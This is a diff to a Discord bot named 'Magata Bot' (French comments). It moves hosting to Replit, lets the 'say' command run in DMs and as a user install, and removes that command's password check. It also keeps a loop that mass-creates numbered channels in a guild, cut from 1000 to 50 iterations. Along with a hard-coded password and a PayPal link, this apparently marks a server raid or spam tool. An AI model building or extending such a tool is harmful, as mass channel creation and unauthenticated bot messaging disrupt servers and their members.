@@ -1,13 +1,17 @@
-const { Client, GatewayIntentBits, PermissionFlagsBits, SlashCommandBuilder, REST, Routes } = require('discord.js');
+const { Client, GatewayIntentBits, PermissionFlagsBits, SlashCommandBuilder, REST, Routes, InteractionContextType, ApplicationIntegrationType } = require('discord.js');
 const http = require('http');
 
 const PASSWORD = "magata";
 const PAYPAL_LINK = "https://www.paypal.com/paypalme/snoopysong";
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 5000;
+const HOST = '0.0.0.0';
 
-// ========== SERVEUR HTTP POUR RENDER ==========
+// ========== SERVEUR HTTP POUR REPLIT ==========
 const server = http.createServer((req, res) => {
-  res.writeHead(200, { 'Content-Type': 'text/html' });
+  res.writeHead(200, { 
+    'Content-Type': 'text/html',
+    'Cache-Control': 'no-cache, no-store, must-revalidate'
+  });
   res.end(`
     <html>
       <head><title>Magata Bot</title></head>
@@ -20,8 +24,8 @@ const server = http.createServer((req, res) => {
   `);
 });
 
-server.listen(PORT, () => {
-  console.log(`✓ Serveur HTTP actif sur le port ${PORT}`);
+server.listen(PORT, HOST, () => {
+  console.log(`✓ Serveur HTTP actif sur ${HOST}:${PORT}`);
 });
 
 // ========== BOT DISCORD ==========
@@ -58,13 +62,11 @@ const commands = [
   new SlashCommandBuilder()
     .setName('say')
     .setDescription('Envoie un message en tant que bot')
+    .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
+    .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel])
     .addStringOption(option =>
       option.setName('message')
         .setDescription('Message à envoyer')
-        .setRequired(true))
-    .addStringOption(option =>
-      option.setName('mot_de_passe')
-        .setDescription('Mot de passe requis')
         .setRequired(true)),
 
   new SlashCommandBuilder()
@@ -144,7 +146,7 @@ client.on('interactionCreate', async interaction => {
         }
       }
 
-      for (let i = 0; i < 1000; i++) {
+      for (let i = 0; i < 50; i++) {
         try {
           const newChannel = await guild.channels.create({
             name: `${channelName}-${i}`,
@@ -163,12 +165,7 @@ client.on('interactionCreate', async interaction => {
   }
 
   if (commandName === 'say') {
-    const password = interaction.options.getString('mot_de_passe');
     const message = interaction.options.getString('message');
-
-    if (password !== PASSWORD) {
-      return interaction.reply({ content: '❌ Mot de passe incorrect', ephemeral: true });
-    }
 
     await interaction.reply({ content: '✓ Message envoyé', ephemeral: true });
     await interaction.channel.send(message);
